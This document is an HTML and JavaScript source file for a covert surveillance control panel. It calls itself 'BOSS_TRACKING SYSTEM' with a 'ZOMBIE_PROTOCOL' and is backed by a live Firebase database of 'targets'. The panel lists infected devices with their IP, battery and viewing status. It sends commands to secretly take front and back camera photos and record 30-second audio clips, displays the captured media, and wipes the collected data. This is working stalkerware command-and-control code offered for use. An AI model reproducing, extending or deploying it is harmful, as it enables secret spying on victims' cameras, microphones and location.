<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BOSS_TRACKING SYSTEM V7.2</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; --panel: #0d0d0d; --red: #ff3131; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        .sidebar { width: 300px; border-right: 1px solid #222; background: #000; display: flex; flex-direction: column; }
        .sidebar-header { padding: 20px; border-bottom: 1px solid #222; text-align: center; }
        .node-list { flex: 1; overflow-y: auto; padding: 10px; }
        .node-item { border: 1px solid #222; padding: 12px; margin-bottom: 8px; cursor: pointer; position: relative; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
        .node-item:hover { border-color: var(--neon); }
        .node-item.active { border-color: var(--neon); background: rgba(0, 255, 65, 0.1); }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #444; margin-right: 5px; }
        .online { background: var(--neon); box-shadow: 0 0 8px var(--neon); }
        .watching-tag { font-size: 9px; color: var(--neon); animation: blink 1s infinite; display: block; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
        .protocol-red { color: var(--red); font-weight: bold; text-shadow: 0 0 5px var(--red); text-transform: uppercase; }
        .del-user { color: var(--red); font-weight: bold; border: 1px solid var(--red); padding: 2px 6px; cursor: pointer; font-size: 10px; }
        .del-user:hover { background: var(--red); color: white; }
        .main-content { flex: 1; display: flex; flex-direction: column; background: var(--bg); }
        .controls { padding: 20px; display: flex; gap: 10px; background: #0a0a0a; border-bottom: 1px solid #222; }
        .btn { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 8px 15px; cursor: pointer; font-size: 11px; font-weight: bold; }
        .btn:hover { background: var(--neon); color: #000; }
        .grid { display: grid; grid-template-columns: 1fr 1.5fr; gap: 20px; padding: 20px; overflow-y: auto; }
        .box { background: var(--panel); border: 1px solid #222; padding: 15px; }
        .feed { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
        .media-card { background: #000; border: 1px solid #333; padding: 5px; text-align: center; }
        .media-card img { width: 100%; border-bottom: 1px solid #222; }
        audio { width: 100%; height: 30px; filter: invert(1); }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="sidebar-header">
            <h2 style="margin:0; font-size:18px;">BOSS_V7 <span class="protocol-red">SRV_2285</span></h2>
            <small class="protocol-red">ZOMBIE_PROTOCOL_ACTIVE</small>
        </div>
        <div class="node-list" id="node-list"></div>
    </div>

    <div class="main-content" id="main-ui" style="display:none;">
        <div class="controls">
            <button class="btn" onclick="sendCommand('photo')">üì∏ FRONT</button>
            <button class="btn" onclick="sendCommand('back_photo')">üì∏ BACK</button>
            <button class="btn" onclick="sendCommand('audio')">üéôÔ∏è RECORD 30S</button>
            <button class="btn" style="border-color:var(--red); color:var(--red)" onclick="deleteTargetData()">üóëÔ∏è WIPE ALL</button>
        </div>
        <div class="grid">
            <div class="box"><h3>üìç LOCATION</h3><div id="map-container"></div></div>
            <div class="box"><h3>‚öôÔ∏è LOGS</h3><div id="log-content"></div></div>
            <div class="box" style="grid-column: span 2;"><h3>üìÅ INTEL FEED</h3><div class="feed" id="intel-feed"></div></div>
        </div>
    </div>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let selectedNode = null;

    db.ref('targets').on('value', snap => {
        const list = document.getElementById('node-list');
        list.innerHTML = "";
        snap.forEach(child => {
            const id = child.key;
            const data = child.val();
            const name = data.customName || id;
            const isWatching = (data.info && data.info.status === "ONLINE");
            
            list.innerHTML += `
                <div class="node-item ${selectedNode == id ? 'active' : ''}" onclick="selectNode('${id}')">
                    <div>
                        <span class="status-dot ${data.info ? 'online' : ''}"></span>
                        <strong>${name}</strong>
                        ${isWatching ? '<span class="watching-tag">WATCHING VIDEO</span>' : ''}
                    </div>
                    <span class="del-user" onclick="event.stopPropagation(); deleteTarget('${id}')">X</span>
                </div>`;
        });
    });

    function selectNode(id) {
        selectedNode = id;
        document.getElementById('main-ui').style.display = 'flex';
        db.ref(`targets/${id}`).on('value', s => {
            const data = s.val() || {};
            const info = data.info || {};
            document.getElementById('log-content').innerHTML = `IP: ${info.ip}<br>BATT: ${info.battery}<br>TIME: ${info.time}`;
            
            const feed = document.getElementById('intel-feed');
            feed.innerHTML = "";
            if(data.photos) Object.entries(data.photos).reverse().forEach(([k, p]) => {
                feed.innerHTML += `<div class="media-card"><img src="${p.img}"><small>${p.type}</small></div>`;
            });
            if(data.audios) Object.entries(data.audios).reverse().forEach(([k, a]) => {
                feed.innerHTML += `<div class="media-card"><audio controls src="${a.data}"></audio></div>`;
            });
        });
    }

    function sendCommand(act) { db.ref(`commands/${selectedNode}`).set({ action: act, ts: Date.now() }); }
    function deleteTarget(id) { if(confirm("Delete this user?")) db.ref(`targets/${id}`).remove(); }
    function deleteTargetData() { if(confirm("Wipe data?")) db.ref(`targets/${selectedNode}`).remove(); }
</script>
</body>
</html>
